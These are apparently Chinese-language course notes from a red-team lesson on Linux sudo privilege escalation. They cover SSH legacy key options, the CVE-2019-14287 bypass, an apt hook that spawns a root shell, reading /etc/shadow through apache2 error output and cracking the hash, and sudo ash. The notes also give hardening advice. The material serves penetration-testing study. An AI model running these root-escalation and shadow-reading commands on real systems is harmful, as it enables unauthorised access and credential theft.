<h3 id="处理ssh登录参数问题（精）"><a href="#处理ssh登录参数问题（精）" class="headerlink" title="处理ssh登录参数问题（精）"></a>处理ssh登录参数问题（精）</h3><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="" cid="n5872" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">sudo ssh -i 私钥文件 obama@10.10.10.25       绵密免密登录</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span>-i 指定私钥</span></pre></div></div></div></div></div><div></div></div></div></pre>

<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251112192644612.png?lastModify=1766751620" alt="image-20251112192644612"></p>
<h3 id="主键类型的问题"><a href="#主键类型的问题" class="headerlink" title="主键类型的问题"></a>主键类型的问题</h3><p><strong>无法与22端口进行协商，因为没有匹配的主键类型（之前讲过很多次）</strong></p>
<p><strong>没有什么就给他什么</strong></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="" cid="n5877" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">sudo ssh -i 私钥文件 obama@10.10.10.25 -oHostKeyAlgorithms=ssh-rsa,ssh-dss</span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251112193101808.png?lastModify=1766751620" alt="image-20251112193101808"></p>
<p><strong>现在获得了banner的交互，他还找我要密码。相当于我给他私钥，但是****是无效</strong>的</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251112193303900.png?lastModify=1766751620" alt="image-20251112193303900"></p>
<p><strong>如何解决：先看一下ssh连接的详细过程</strong></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="" cid="n5882" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">sudo ssh -i 私钥文件 obama@10.10.10.25 -oHostKeyAlgorithms=ssh-rsa,ssh-dss -vv</span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251112193456915.png?lastModify=1766751620" alt="image-20251112193456915"></p>
<p><strong>他在执行过程中的数据交换，请求，都会在这个调试中列出来debug</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251112193709899.png?lastModify=1766751620" alt="image-20251112193709899"></p>
<h3 id="pubkey的问题"><a href="#pubkey的问题" class="headerlink" title="pubkey的问题"></a>pubkey的问题</h3><p><strong>这里说没有共同的签名支持，说明是这行的****pubkey</strong>的问题，给他参数</p>
<p><strong>签名是类型的问题（第一个）不是认证的问题（第二个）</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251112193923468.png?lastModify=1766751620" alt="image-20251112193923468"></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="" cid="n5890" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">sudo ssh -i 私钥文件 obama@10.10.10.25 -oHostKeyAlgorithms=ssh-rsa,ssh-dss -oPubkeyAcceptedKeyTypes=ssh-rsa,ssh-dss</span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251112194028525.png?lastModify=1766751620" alt="image-20251112194028525"></p>
<p><strong>看似是个小问题，没经验的话这条路径就走不通了</strong></p>
<h3 id="其他可能遇见的问题"><a href="#其他可能遇见的问题" class="headerlink" title="其他可能遇见的问题"></a>其他可能遇见的问题</h3><p><strong>用到ssh 经常会有：版本的问题，协议的问题，加密的问题（不会的就-vv显示详细过程，然后ai）</strong></p>
<h4 id="获得初始权限shell"><a href="#获得初始权限shell" class="headerlink" title="获得初始权限shell"></a>获得初始权限shell</h4><p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251112194442296.png?lastModify=1766751620" alt="image-20251112194442296"></p>
<h1 id="「红队笔记」Linux提权精讲：Sudo风暴-Sudo风暴全70讲，扫地僧级别心法，研究提权技术的同时，打磨你对linux内核的深度理解。渗透测试宝典。"><a href="#「红队笔记」Linux提权精讲：Sudo风暴-Sudo风暴全70讲，扫地僧级别心法，研究提权技术的同时，打磨你对linux内核的深度理解。渗透测试宝典。" class="headerlink" title="「红队笔记」Linux提权精讲：Sudo风暴 - Sudo风暴全70讲，扫地僧级别心法，研究提权技术的同时，打磨你对linux内核的深度理解。渗透测试宝典。"></a>「红队笔记」Linux提权精讲：Sudo风暴 - Sudo风暴全70讲，扫地僧级别心法，研究提权技术的同时，打磨你对linux内核的深度理解。渗透测试宝典。</h1><p><strong>Linux提权精讲之Sudo风暴，70种提权一次讲完，扫地僧级别心法，研究提权技术的同时，打磨你对linux内核的深度理解。</strong></p>
<p><strong>本期视频涉及的Linux提权演示种类有：</strong></p>
<p><strong>开篇精要</strong></p>
<ol>
<li><strong>CVE-2019-14287</strong></li>
<li><strong>sudo apt</strong></li>
<li><strong>sudo apache2</strong></li>
<li><strong>sudo ash</strong></li>
<li><strong>sudo awk</strong></li>
<li><strong>sudo base64</strong></li>
<li><strong>sudo bash</strong></li>
<li><strong>sudo cp</strong></li>
<li><strong>sudo cpulimit</strong></li>
<li><strong>sudo curl</strong></li>
<li><strong>sudo date</strong></li>
<li><strong>sudo dd</strong></li>
<li><strong>sudo dstat - hard</strong></li>
<li><strong>sudo ed</strong></li>
<li><strong>sudo env</strong></li>
<li><strong>sudo exiftool - hard</strong></li>
<li><strong>sudo expect</strong></li>
<li><strong>sudo fail2ban - hard</strong></li>
<li><strong>sudo find</strong></li>
<li><strong>sudo flock</strong></li>
<li><strong>sudo ftp</strong></li>
<li><strong>sudo gcc</strong></li>
<li><strong>sudo gdb</strong></li>
<li><strong>sudo git</strong></li>
<li><strong>sudo gzip&#x2F;gunzip</strong></li>
<li><strong>sudo hping3</strong></li>
<li><strong>sudo iftop</strong></li>
<li><strong>sudo java</strong></li>
<li><strong>sudo jjs - hard</strong></li>
<li><strong>sudo journalctl</strong></li>
<li><strong>sudo knife</strong></li>
<li><strong>sudo less</strong></li>
<li><strong>sudo man</strong></li>
<li><strong>sudo more</strong></li>
<li><strong>sudo mount</strong></li>
<li><strong>sudo mysql</strong></li>
<li><strong>sudo nano</strong></li>
<li><strong>sudo neofetch</strong></li>
<li><strong>sudo nice</strong></li>
<li><strong>sudo nmap</strong></li>
<li><strong>sudo node</strong></li>
<li><strong>sudo nohup</strong></li>
<li><strong>sudo openvpn - hard</strong></li>
<li><strong>sudo passwd</strong></li>
<li><strong>sudo perl</strong></li>
<li><strong>sudo php</strong></li>
<li><strong>sudo pico</strong></li>
<li><strong>sudo pkexec</strong></li>
<li><strong>sudo python3</strong></li>
<li><strong>sudo rvim</strong></li>
<li><strong>sudo scp</strong></li>
<li><strong>sudo screen</strong></li>
<li><strong>sudo script</strong></li>
<li><strong>sudo sed</strong></li>
<li><strong>sudo service</strong></li>
<li><strong>sudo socat</strong></li>
<li><strong>sudo ssh</strong></li>
<li><strong>sudo ssh-keygen - hard</strong></li>
<li><strong>sudo strace</strong></li>
<li><strong>sudo systemctl</strong></li>
<li><strong>sudo tcpdump - hard</strong></li>
<li><strong>sudo tee</strong></li>
<li><strong>sudo timedatectl</strong></li>
<li><strong>sudo tmux</strong></li>
<li><strong>sudo vi</strong></li>
<li><strong>sudo wall</strong></li>
<li><strong>sudo watch</strong></li>
<li><strong>sudo wget</strong></li>
<li><strong>sudo zip</strong></li>
<li><strong>sudo xxd</strong></li>
</ol>
<p><strong>CalltoAction</strong></p>
<p><strong>全70种提权演示。</strong></p>
<h2 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h2><p><strong>聚焦</strong><code>sudo shell</code>逃逸提权序列，提全过程中，一定会想到 <code>sudo -l</code>进行枚举，看当前用户可以以其他用户&#x2F;<strong>root</strong>权限执行哪些命令</p>
<p><code>live off the land</code>靠山吃山，用已有文件打到利用目的，使用系统自带可执行文件，绕开本地安全限制</p>
<p>** **<code>https://gtfobins.github.io</code> 是Linux可利用的自带文件</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251129201038565.png?lastModify=1766751620" alt="image-20251129201038565"></p>
<p><strong>比如我现在有</strong><code>awk</code>的<code>sudo</code>权限，在输入框搜索，找到利用方式直接用即可（上下有使用前提介绍）</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251129201404307.png?lastModify=1766751620" alt="image-20251129201404307"></p>
<p><strong>下面的演示是基于这个来的：</strong></p>
<ol>
<li><strong>对</strong><code>GTFOBins</code>的命令进行解释</li>
<li><strong>演示操作是理解****Linux权限体系</strong>的宝贵资料，是做更<strong>复杂提权的基础</strong></li>
<li><strong>对这类提权的具体操作有明确理解后归纳总结，提升挖洞的能力</strong></li>
<li><strong>sudo语法自行了解</strong></li>
</ol>
<p><strong>下面的过程是<code>GTFOBins</code>的最佳实践，是由隐藏字节流&#x2F;痕迹…的好处的</strong></p>
<p><strong>解释一下下面常见的</strong><code>fork + execve(&quot;/bin/bash&quot;)</code></p>
<p>**二进制程序遇到 **<code>! /bin/bash</code>后执行<code>fork + execve(&quot;/bin/bash&quot;)</code></p>
<p><code>fork + execve(&quot;/bin/bash&quot;)</code> 是 Linux&#x2F;Unix 创建新进程的 <strong>“黄金两步”</strong>：</p>
<ol>
<li><strong>fork</strong> **内核把当前进程 **<strong>完整复制一份</strong>（代码、数据、文件描述符、权限），得到 <strong>子进程</strong>，<strong>PID 不同</strong>，<strong>内存空间独立</strong>（写时复制）。</li>
<li><strong>execve(“&#x2F;bin&#x2F;bash”)</strong> **子进程 **<strong>把自身映像替换成 <code>/bin/bash</code></strong>，代码段、数据段全部重置，<strong>PID 不变</strong>，<strong>身份不变</strong>（root 还是 root），<strong>文件描述符默认继承</strong>。</li>
</ol>
<p><strong>结果：</strong> <strong>父进程继续跑原程序，子进程变成 bash，用户拿到新 shell。</strong></p>
<ul>
<li>**如果 **<code>二进制程序</code> 是 <strong>sudo 启动的</strong> → UID&#x3D;0 → <code>fork + execve(&quot;/bin/bash&quot;)</code> 后 <strong>bash 仍是 UID&#x3D;0</strong>，即 <strong>root shell</strong>。</li>
</ul>
<p><strong>root权限如何给普通用户NOPASSWD的root权限？</strong></p>
<p><strong>visudo</strong></p>
<p><strong>**</strong><code>lmlsama ALL=(root) NOPASSWD: /usr/bin/rsync**</code></p>
<h2 id="CVE-2019-14287"><a href="#CVE-2019-14287" class="headerlink" title="CVE-2019-14287"></a>CVE-2019-14287</h2><p><strong>可以以所有的用户身份(****!root</strong>)，不需要密码，执行<code>/bin/bash</code>命令,但不能是root</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251129202010405.png?lastModify=1766751620" alt="image-20251129202010405"></p>
<p><strong>下面是</strong><code>sudoer</code>的语法，可以启动新用户角色下的bash会话，实现用户的切换</p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="" cid="n6098" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">sudo -u 想新起的用户名 /bin/bash<span class="cm-tab" role="presentation" cm-text="	">   </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span>|<span class="cm-tab" role="presentation" cm-text="	">   </span> sudo -u#想新起的用户的uid /bin/bash</span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251129202347330.png?lastModify=1766751620" alt="image-20251129202347330"><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251129202406462.png?lastModify=1766751620" alt="image-20251129202406462"></p>
<p><strong>而想进行提权切换到root，执行以下命令即可。</strong><code>sudo</code>会把 <strong>-1</strong> 解释为 <strong>0</strong>  这是<code>sudo</code>的算法漏洞</p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="" cid="n6101" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">sudo -u#-1 /bin/bash</span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251129202913392.png?lastModify=1766751620" alt="image-20251129202913392"></p>
<p><strong>实现了提权</strong></p>
<p><strong>这只在旧系统的</strong><code>sudo</code><strong>1.8.28之前</strong>  <strong>可能</strong>有用</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251129203113640.png?lastModify=1766751620" alt="image-20251129203113640"></p>
<p><strong>比如下面我的CentOS7也是1.8.28之前的，但是漏洞无效</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251129203542616.png?lastModify=1766751620" alt="image-20251129203542616"></p>
<h3 id="为什么是“1-8-28-之前”却打不通？"><a href="#为什么是“1-8-28-之前”却打不通？" class="headerlink" title="为什么是“1.8.28 之前”却打不通？"></a>为什么是“1.8.28 之前”却打不通？</h3><ul>
<li><strong>官方公告给出的 *<em><strong>1.8.28 是“上游 feature 完全修复”的版本号</strong>，但 Red Hat&#x2F;CentOS 早在 1.8.23 的 <strong>向后移植补丁（backport）</strong> 里就 cherry-pick 了拒绝负 UID 的校验逻辑，因此 1.8.23-4.el7（及以后）已免疫 ^[^<strong>RHSA-2019:3515-01^</strong>]^</em>*。</strong></li>
<li><strong>类似情况：Ubuntu 18.04 的 1.8.21p2-3ubuntu1.1、Debian 9 的 1.8.19p1-2.1+deb9u1 也都提前打了补丁，版本号虽低于 1.8.28，但漏洞入口同样被封。</strong></li>
</ul>
<h3 id="如何判断“到底修没修”"><a href="#如何判断“到底修没修”" class="headerlink" title="如何判断“到底修没修”"></a>如何判断“到底修没修”</h3><p><strong>最靠谱的办法不是看大版本号，而是：</strong></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n6118" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">rpm <span class="cm-attribute">-q</span> <span class="cm-attribute">--changelog</span> <span class="cm-builtin">sudo</span> | <span class="cm-builtin">grep</span> <span class="cm-attribute">-i</span> <span class="cm-attribute">-E</span> <span class="cm-string">'14287|-1'</span></span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<p><strong>如果能看到类似</strong></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="" cid="n6120" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">- Fix for CVE-2019-14287 (negative UID bypass)</span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<p><strong>就说明 Red Hat 已经给你补上了。</strong></p>
<p><strong>如图，确实修了</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251129203745317.png?lastModify=1766751620" alt="image-20251129203745317"></p>
<h2 id="sudo-apt-apt-get"><a href="#sudo-apt-apt-get" class="headerlink" title="sudo apt&#x2F;apt-get"></a>sudo apt&#x2F;apt-get</h2><p><strong>apt&#x2F;apt-get的利用方式完全相同</strong></p>
<p><strong>发现有apt的SUID</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251129204017598.png?lastModify=1766751620" alt="image-20251129204017598"></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251129204000364.png?lastModify=1766751620" alt="image-20251129204000364"></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n6133" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">sudo</span> apt update <span class="cm-attribute">-o</span> APT::Update::Pre-Invoke::<span class="cm-operator">=</span>/bin/bash</span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<ul>
<li><code>sudo</code> 允许你以 root 身份运行 <code>apt</code>。</li>
<li><code>apt</code> 支持通过 <code>-o</code> 参数传入 <strong>任意配置选项</strong>。</li>
<li><code>APT::Update::Pre-Invoke</code> 是一个 <strong>钩子（hook）</strong>，它会在 <code>apt update</code> 实际执行前，运行你指定的命令。即APT的<strong>预处理指令</strong>。 <code>::</code>冒号类似于名字空间，逐级访问子配置</li>
<li>**指定的是 **<code>/bin/bash</code>，于是 <strong>在 apt 更新前，先弹一个 root shell</strong>。</li>
<li>**总：**<strong>利用 <code>apt</code> 的配置选项，在更新包列表之前，先执行 <code>/bin/bash</code>，从而拿到一个 root shell</strong></li>
</ul>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251129204749560.png?lastModify=1766751620" alt="image-20251129204749560"></p>
<p><strong>在<code>GTFOBins</code>共给出三种方式，一种不行另一个，apt-get同理</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251129205132598.png?lastModify=1766751620" alt="image-20251129205132598"><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251129205312919.png?lastModify=1766751620" alt="image-20251129205312919"></p>
<h3 id="前提条件（必须满足）"><a href="#前提条件（必须满足）" class="headerlink" title="前提条件（必须满足）"></a>前提条件（必须满足）</h3><table>
<thead>
<tr>
<th><strong>条件</strong></th>
<th><strong>说明</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>✅</strong><code>sudo</code>权限</td>
<td><strong>你当前用户必须在</strong><code>/etc/sudoers</code>里被授权运行<code>apt</code></td>
</tr>
<tr>
<td><strong>✅ 无限制参数</strong></td>
<td><code>sudoers</code>里不能禁用<code>apt</code>的<code>-o</code>选项（默认不禁）</td>
</tr>
<tr>
<td><strong>✅ 未设置</strong><code>NOEXEC</code>标签</td>
<td><strong>如果管理员加了</strong><code>NOEXEC:</code>，则无法执行外部命令</td>
</tr>
</tbody></table>
<h3 id="防御建议（给管理员）"><a href="#防御建议（给管理员）" class="headerlink" title="防御建议（给管理员）"></a>防御建议（给管理员）</h3><ol>
<li><p><strong>不要把 <code>apt</code> 放给普通用户 <code>sudo</code> 权限</strong> **如果必须给，务必写成 **<strong>白名单命令</strong>，例如：</p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="" cid="n6170" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">username ALL=(root) /usr/bin/apt update, /usr/bin/apt upgrade</span></pre></div></div></div></div></div></div><div></div></div></div></pre></li>
<li><p><strong>加 <code>NOEXEC</code> 标签</strong></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="" cid="n6173" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">username ALL=(root) NOEXEC: /usr/bin/apt</span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<p>**这样即使传 **<code>-o</code> 也无法执行外部程序。</p>
</li>
<li><p><strong>用 <code>sudoedit</code> 或 <code>pkexec</code> 替代直接 sudo</strong> 更细粒度控制</p>
</li>
</ol>
<h2 id="sudo-apache2"><a href="#sudo-apache2" class="headerlink" title="sudo apache2"></a>sudo apache2</h2><p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251129205443727.png?lastModify=1766751620" alt="image-20251129205443727"></p>
<p><code>-f</code>指定 <code>apache2</code>的配置文件，这里我们给他的是 <code>/etc/shadow</code>不是他的配置文件，肯定会有<strong>报错</strong>，而报错却会<strong>泄漏文件内容</strong>。相当于敏感信息泄漏，这里直接泄漏了 <code>shadow</code>的第一行 root的密码hash</p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n6182" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">sudo</span> apache2 <span class="cm-attribute">-f</span> /etc/shadow</span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251129205645500.png?lastModify=1766751620" alt="image-20251129205645500"></p>
<p>**拿到hash值尝试进行破解，**<strong>整行</strong>取出，<code>john</code>破解</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251129210050967.png?lastModify=1766751620" alt="image-20251129210050967"></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251129210005586.png?lastModify=1766751620" alt="image-20251129210005586"></p>
<p><strong>破解得到密码，直接</strong><code>su</code>切换root用户即可</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251129210129690.png?lastModify=1766751620" alt="image-20251129210129690"></p>
<h2 id="sudo-ash"><a href="#sudo-ash" class="headerlink" title="sudo ash"></a>sudo ash</h2><p><strong>ash</strong> 通常指 <strong>Almquist Shell</strong>——一个为了取代体积庞大的 Bourne shell（&#x2F;bin&#x2F;sh）而写的轻量级 POSIX shell 实现。</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251129210341147.png?lastModify=1766751620" alt="image-20251129210341147"></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251129210816811.png?lastModify=1766751620" alt="image-20251129210816811"></p>
<p><strong>直接提权成功</strong></p>
<p><strong>关键是能识别出ash，本身就是一个shell</strong></p>
